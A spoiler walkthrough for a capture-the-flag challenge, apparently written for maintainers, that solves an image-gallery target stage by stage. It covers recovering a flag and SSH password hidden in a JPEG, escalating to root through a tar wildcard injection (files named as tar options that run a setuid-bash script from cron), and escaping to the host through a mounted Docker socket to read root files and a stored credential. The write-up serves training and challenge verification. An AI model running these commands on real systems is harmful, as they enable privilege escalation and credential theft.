# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 gallery, 22 outer-host SSH, 23 gallery
container SSH.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. It is an image gallery. The page and its HTML
  comment stress that the photos are unedited exports with EXIF and "embedded
  shot notes" left intact; do not strip the metadata.
- The originals are browsable at `http://TARGET:8080/images/` (nginx autoindex):
  `harbor.jpg`, `dunes.jpg`, `pier.jpg`, `cliffs.jpg`.

## Stage 1 - Hidden data in the image (first inner flag + credential)

- Download the originals and inspect their metadata. `dunes.jpg` is the one that
  carries hidden data.
- EXIF `UserComment` holds the first inner flag:

  ```bash
  curl -s http://TARGET:8080/images/dunes.jpg -o dunes.jpg
  exiftool dunes.jpg            # UserComment: Shot notes: FLAG{...}
  strings dunes.jpg | grep FLAG # same, no exiftool required
  ```

- A zip is appended after the JPEG data. It holds milo's SSH credential:

  ```bash
  unzip -o dunes.jpg            # extracts note.txt
  cat note.txt                  # host: gallery / user: milo / pass: ...
  # binwalk dunes.jpg and strings dunes.jpg also reveal it
  ```

## Stage 2 - Into the gallery container (milo)

- Use milo's recovered password against the gallery container SSH, published on
  port 23:

  ```bash
  ssh milo@TARGET -p 23
  cat ~/milo.txt               # second inner flag, FLAG{...}
  ```

## Stage 3 - milo to container root (tar wildcard injection)

- `cat /etc/crontab` shows a root job that runs once a minute:

  ```
  * * * * * root cd /var/backups/site && /bin/tar -czf /var/backups/site.tar.gz *
  ```

- `/var/backups/site` is world-writable (`ls -ld` shows `0777`). The bare `*`
  lets a local user smuggle tar options in as filenames (GTFOBins tar wildcard).
- Drop a payload and the two option files, then wait up to a minute for cron:

  ```bash
  cd /var/backups/site
  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
  touch -- '--checkpoint=1'
  touch -- '--checkpoint-action=exec=sh shell.sh'
  # wait for the next minute boundary
  /tmp/rootbash -p
  cat /root/stego-root.txt     # inner root flag, STEGO_FLAG{...}
  ```

## Stage 4 - Container root to outer-host root (mounted Docker socket)

- As root in the gallery container, `/var/run/docker.sock` is mounted and a
  static `docker` client is present. Launch a container that mounts the outer
  host filesystem and read the outer root flag:

  ```bash
  docker run --rm -v /:/host alpine cat /host/root/root.txt   # MAIN_FLAG{...}
  ```

## Stage 5 - Outer-host user flag (recovered credential + SSH)

- Still using the socket mount, recover iris's SSH password from her home:

  ```bash
  docker run --rm -v /:/host alpine cat /host/home/iris/.backup/credentials.conf
  ```

- SSH into the outer host as iris on port 22 and read the user flag:

  ```bash
  ssh iris@TARGET -p 22
  cat ~/user.txt               # MAIN_FLAG{...}
  ```

## Notes and red herrings

- Only `dunes.jpg` carries hidden data; the other three images are plain
  gradients with no metadata payload.
- The outer root flag is reachable directly through the socket mount; the SSH
  step in Stage 5 exists to exercise the recovered credential and reach the outer
  user flag, and demonstrates that both techniques (socket mount and stolen
  credential) work.
- Maintainer note: the inner stack sources are staged on the outer host at
  `/opt/stack` (`root:root`, mode `0700`), outside any player home, so the
  unprivileged outer account `iris` cannot read the inner secrets, the first
  inner flag source, or the breakout notes before escalating. The compose file
  is at `/opt/stack/docker-compose.yaml`.
- Maintainer note: the gallery image ships no `sudo`; container-root escalation
  is the tar wildcard cron job only, so there is no unconfigured-`sudo` decoy.
